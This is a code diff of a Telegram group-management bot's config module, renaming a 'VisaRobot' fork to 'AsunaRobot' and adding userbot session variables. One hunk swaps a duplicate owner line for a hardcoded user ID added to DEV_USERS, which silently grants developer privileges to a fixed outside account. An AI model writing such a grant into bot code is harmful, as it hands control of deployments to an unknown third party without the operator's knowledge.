@@ -93,6 +93,12 @@ if ENV:
     SPAMWATCH_API = os.environ.get("SPAMWATCH_API", None)
 
     ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)
+    
+#-----------------------------------------------AsunaRobot/services/telethonuserbot.py (ENV)-------------------------------------------------------    
+    STRING_SESSION = os.environ.get("STRING_SESSION", True)
+    APP_ID = os.environ.get("APP_ID", True)
+    APP_HASH = os.environ.get("APP_HASH", True)
+#------------------------------------------------------------------------------------------------------------------------------
 
     try:
         BL_CHATS = set(int(x) for x in os.environ.get("BL_CHATS", "").split())
@@ -100,7 +106,7 @@ if ENV:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
 else:
-    from VisaRobot.config import Development as Config
+    from AsunaRobot.config import Development as Config
 
     TOKEN = Config.TOKEN
 
@@ -174,7 +180,7 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(1665347268)
 
 if not SPAMWATCH_API:
     sw = None
@@ -188,8 +194,8 @@ else:
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
-telethn = TelegramClient("visa", API_ID, API_HASH)
-pbot = Client("visapbot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
+telethn = TelegramClient("yone", API_ID, API_HASH)
+pbot = Client("yonepbot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
 
 DRAGONS = list(DRAGONS) + list(DEV_USERS)
@@ -199,7 +205,7 @@ DEMONS = list(DEMONS)
 TIGERS = list(TIGERS)
 
 # Load at end to ensure all prev variables have been set
-from VisaRobot.modules.helper_funcs.handlers import (
+from AsunaRobot.modules.helper_funcs.handlers import (
     CustomCommandHandler,
     CustomMessageHandler,
     CustomRegexHandler,
